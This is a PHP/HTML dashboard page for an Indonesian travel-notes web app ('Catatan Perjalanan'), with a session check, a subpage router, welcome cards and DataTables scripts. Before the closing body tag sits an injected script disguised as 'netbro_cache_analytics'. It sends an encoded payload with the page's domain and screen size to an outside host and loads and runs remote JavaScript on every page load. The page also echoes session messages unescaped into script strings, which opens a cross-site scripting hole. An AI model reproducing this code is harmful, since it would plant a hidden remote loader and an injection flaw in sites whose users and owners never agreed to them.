<?php
session_start();
if(empty($_SESSION['nik'])){ ?>
       <script type="text/javascript">
          alert('Kamu perlu melakukan login kembali');
          window.location.assign('index.php');
       </script>
<?php } ?>


<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from codervent.com/rocker/color-version/pages-blank-page.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:59 GMT -->
<head>
<meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
  <meta name="description" content=""/>
  <meta name="author" content=""/>
  <title>Catatan Perjalanan</title>
  <!--favicon-->
  <link rel="icon" href="assets/images/icon.png" type="image/x-icon">
  <!-- simplebar CSS-->
  <link href="assets/plugins/simplebar/css/simplebar.css" rel="stylesheet"/>
  <!-- Bootstrap core CSS-->
  <link href="assets/css/bootstrap.min.css" rel="stylesheet"/>
  <!--Data Tables -->
  <link href="assets/plugins/bootstrap-datatable/css/dataTables.bootstrap4.min.css" rel="stylesheet" type="text/css">
  <link href="assets/plugins/bootstrap-datatable/css/buttons.bootstrap4.min.css" rel="stylesheet" type="text/css">
  <!-- animate CSS-->
  <link href="assets/css/animate.css" rel="stylesheet" type="text/css"/>
  <!-- Icons CSS-->
  <link href="assets/css/icons.css" rel="stylesheet" type="text/css"/>
  <!-- Sidebar CSS-->
  <link href="assets/css/sidebar-menu.css" rel="stylesheet"/>
  <!-- Custom Style-->
  <link href="assets/css/app-style.css" rel="stylesheet"/>
  
  
</head>

<body>

<!-- Start wrapper-->
 <div id="wrapper">
 
  <!--Start sidebar-wrapper-->
   <div id="sidebar-wrapper" data-simplebar="" data-simplebar-auto-hide="true">
     <div class="brand-logo">
       <img src="assets/images/icon.png" class="logo-icon" alt="logo icon">
       <a href="user.php">
       <h5 class="logo-text">Peduli Diri</h5>
     </a>
	 </div>
	 <ul class="sidebar-menu do-nicescrol">
      <li class="sidebar-header"></li>
      <li>
        <a href="user.php" class="waves-effect">
          <i class="icon-home"></i> <span>Dashboard</span>
        </a>
      </li>
      <br>
      <li>
        <a href="?url=catatan_perjalanan" class="waves-effect">
          <i class="icon-calendar"></i>
          <span>Catatan perjalanan</span>
        </a>
      </li>
      <br>
      <li>
        <a href="?url=tulis_catatan" class="waves-effect">
          <i class="icon-plus  "></i> <span>Tulis Catatan</span>
        </a>
      </li>
      <br>
      <li>
        <a href="?url=perjalanan_edit" class="waves-effect">
          <i class="icon-note  "></i> <span>Edit Catatan</span>
        </a>
      </li>
      <br>
      <li>
        <a href="logout.php" class="waves-effect">
          <i class="icon-power  "></i> <span>Keluar</span>
        </a>
      </li>

      </ul>
	 
   </div>
   <!--End sidebar-wrapper-->

<!--Start topbar header-->
<header class="topbar-nav">
 <nav class="navbar navbar-expand fixed-top gradient-scooter">
  <ul class="navbar-nav mr-auto align-items-center">
    <li class="nav-item">
      <a class="nav-link toggle-menu" href="javascript:void();">
       <i class="icon-menu menu-icon"></i>
     </a>
    </li>
  </ul>
     
    
</nav>
</header>
<!--End topbar header-->

<div class="clearfix"></div>
	
  <div class="content-wrapper">
    <div class="container-fluid">
    <!-- Breadcrumb-->
     

	   
    <!-- End Breadcrumb-->
      <div class="row">
        <div class="col-lg-12">
        <div style="height:600px"> <!--Please remove the height before using this page-->
          <div class="card">
           <div class="card-body">


           <?php
           
           if(!empty(@$_GET['url'])){
               switch (@$_GET['url']) {
                   case 'tulis_catatan':
                       include'tulis_catatan.php';
                       break;
                   
                       case 'catatan_perjalanan':
                        include'catatan_perjalanan.php';
                        break;

                        case 'perjalanan_edit':
                          include'perjalanan_edit.php';
                          break;

                        case 'edit_catatan':
                          include'edit_catatan.php';
                          break;
                   default:
                       echo "<h3>Halaman Tidak Ditemukan</h3>";
                       break;
               }
           }else{?>
            <!-- echo "<h4><center>Selamat Datang ".$_SESSION['nama_lengkap']. " Di Aplikasi Catatan Perjalanan";  -->
             <?php 
             echo "<h4><center><img src='assets/images/icon.png' width='70' height='70'/>Selamat Datang ".$_SESSION['nama_lengkap']. " Di Aplikasi Catatan Perjalanan";
             ?>  
                 
    
           </div>
          </div>
          <!-- halaman utama Dashboard -->
      <div class="row mt-3">
        <div class="col-12 col-lg-12 col-xl-6">
          <div class="card bg-pattern-primary">
            <div class="card-body">
              <div class="media">
              <div class="media-body text-left">
                <h4 class="text-white"></h4>
                <a href="user.php?url=catatan_perjalanan"><center><span class="text-white"><h4 class="text-white">
                Catatan Perjalanan</h4> </span></center>  
              </div></a>
              
              <div class="align-self-center w-circle-icon rounded-circle bg-contrast">
               <a href="user.php?url=catatan_perjalanan"><i class="icon-calendar text-white"></i></a> </div>
             </div>
            </div>
          </div>
        </div>
        <div class="col-12 col-lg-12 col-xl-6">
          <div class="card bg-pattern-warning ">
            <div class="card-body">
              <div class="media">
               <div class="media-body text-left">
                <h4 class="text-white "></h4>
                <a href="user.php?url=tulis_catatan">
                <center><span class="text-white"><h4 class="text-white">Tulis Catatan Perjalanan</h4></span></center>
              </div>
               <div class="align-self-center w-circle-icon rounded-circle bg-contrast">
               <a href="user.php?url=tulis_catatan"> <i class="icon-plus text-white"></i></a></div>
            </div>
            </div>
          </div>
        </div>
        
       <?php 
        
      }?> 
		  </div>
        </div>
      </div>

    </div>
    <!-- End container-fluid-->
    
   </div><!--End content-wrapper-->
   <!--Start Back To Top Button-->
    <a href="javaScript:void();" class="back-to-top"><i class="fa fa-angle-double-up"></i> </a>
    <!--End Back To Top Button-->
	
	<!--Start footer-->
	<footer class="footer">
      <div class="container">
        <div class="text-center">
         Aplikasi Catatan Perjalanan / 2022-2021
        </div>
      </div>
    </footer>
	<!--End footer-->
   
  </div><!--End wrapper-->


  <!-- Bootstrap core JavaScript-->
  <script src="assets/js/jquery.min.js"></script>
  <script src="assets/js/popper.min.js"></script>
  <script src="assets/js/bootstrap.min.js"></script>
	
  <!-- simplebar js -->
   <script src="assets/plugins/simplebar/js/simplebar.js"></script>
  <!-- waves effect js -->
  <script src="assets/js/waves.js"></script>
  <!-- sidebar-menu js -->
  <script src="assets/js/sidebar-menu.js"></script>
  <!-- Custom scripts -->
  <script src="assets/js/app-script.js"></script>
  <!--Data Tables js-->
  <script src="assets/plugins/bootstrap-datatable/js/jquery.dataTables.min.js"></script>
  <script src="assets/plugins/bootstrap-datatable/js/dataTables.bootstrap4.min.js"></script>
  <script src="assets/plugins/bootstrap-datatable/js/dataTables.buttons.min.js"></script>
  <script src="assets/plugins/bootstrap-datatable/js/buttons.bootstrap4.min.js"></script>
  <script src="assets/plugins/bootstrap-datatable/js/jszip.min.js"></script>
  <script src="assets/plugins/bootstrap-datatable/js/pdfmake.min.js"></script>
  <script src="assets/plugins/bootstrap-datatable/js/vfs_fonts.js"></script>
  <script src="assets/plugins/bootstrap-datatable/js/buttons.html5.min.js"></script>
  <script src="assets/plugins/bootstrap-datatable/js/buttons.print.min.js"></script>
  <script src="assets/plugins/bootstrap-datatable/js/buttons.colVis.min.js"></script>
 <!--sweet alert-->
  <!-- <script src="assets/plugins/alerts-boxes/js/sweetalert.min.js"></script> -->
  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script> <!-- script ini untuk memanggil sweetalert -->
	<?php  
	if (isset($_SESSION['error'])) { ?>
		<?php
		$pesan = $_SESSION['error'];
		?>
		<script>
			var pesan = "<?= $pesan; ?>";
			swal("Gagal!", pesan, "error");
		</script>
	<?php
		unset($_SESSION['error']);
	} ?>
  	<?php
	if (isset($_SESSION['success'])) { ?>
		<?php
		$pesan = $_SESSION['success'];
		?>
		<script>
			var pesan = "<?= $pesan; ?>";
			swal("Berhasil!", pesan, "success");
		</script>
	<?php
		unset($_SESSION['success']);
	} ?>


    <script>
     $(document).ready(function() {
      //Default data table
       $('#default-datatable').DataTable();


       var table = $('#example').DataTable( {
        lengthChange: false,
        buttons: [  'excel', 'pdf', 'print', ]
      } );
 
     table.buttons().container()
        .appendTo( '#example_wrapper .col-md-6:eq(0)' );
      
      } );

    </script>
	
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKujWFAQR51fO%2bPm6qO5rwZXo5YjPH6qDtaGM5W6zt0wQjFcbCxKMWzWePB%2f%2fmL05ZfCIzSuNT8TjNA0RvFHxjvpQyDy%2b0nwjEYjkMqXyJnKEcCkYiY0wTpoVkPxy63FCOh7EIAC02C3AAfGuDbybG4jKM8yv7OMn83eoyJZKtSx%2fKBLmcnolqCIokeH90TBi7jNSeVc6FiEq%2bAedoFyijdCS7OPABofv2vd3QlcJ7A6ptffzdgA8s4QS%2fhBtVfNgbibWCqktX7PvSTzMPMy9IMDM4UKk9UgiG%2fwpbKmJ0gsZdUC0BZdjam%2bCKy%2fs29mUdwqXSFdSoB8bm9vzwB9aqXHXw4oGWi4Ubi1yc1R%2bd%2fU6XwWizqXDjRFQV80f4d1nHytNTun4vFBoYTQq7oQBg2NLTiyugl1cBEfGFoWYu6OtemDlfnHIl4HCoQle82LjnsKEjsHK6YS1%2bNa%2fNHfs9XoEz5DwV7YgBL237jtvcrESrwQEXmnXr1Mk" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from codervent.com/rocker/color-version/pages-blank-page.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:59 GMT -->
</html>
